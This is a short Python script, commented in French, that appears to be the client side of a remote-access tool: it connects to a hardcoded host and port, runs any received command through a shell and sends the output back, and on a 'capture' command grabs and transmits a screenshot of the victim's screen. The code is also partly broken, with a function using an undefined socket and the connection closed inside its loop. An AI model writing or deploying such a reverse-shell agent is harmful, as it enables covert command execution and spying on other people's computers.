import socket
import subprocess
from PIL import ImageGrab

ip_add = "127.0.0.1"
port = 3280

# Lance l'agent
def start_agent(s):
    s.connect((ip_add, port))
    data_socket(s)

# Reception et envoie des données
def data_socket(s):
    while True:
        request = s.recv(1024)
        command = request.decode("utf-8")

        if command == "capture":
            screenshot(s)
        else: 
            execute_command(command)
        
        s.close()

# Execute la commande
def execute_command(command):
    result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout, stderr = result.communicate()
    output = stdout.decode("cp1252", errors="replace") + stderr.decode("cp1252", errors="replace")
    # Envoi du résultat au serveur
    s.send(output.encode("utf-8"))

# Fonction de screenshot
def screenshot(s):
    screen = ImageGrab.grab()

    image_bin = screen.tobytes() # Convertir l'image en binaire
    width, height = screen.size

    # Envoyer les dimensions et les données
    s.send(len(image_bin).to_bytes(4, 'big'))
    s.send(width.to_bytes(4, 'big')) 
    s.send(height.to_bytes(4, 'big'))  
    s.send(image_bin)


if __name__ == "__main__":
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    start_agent(s)
    data_socket(s)
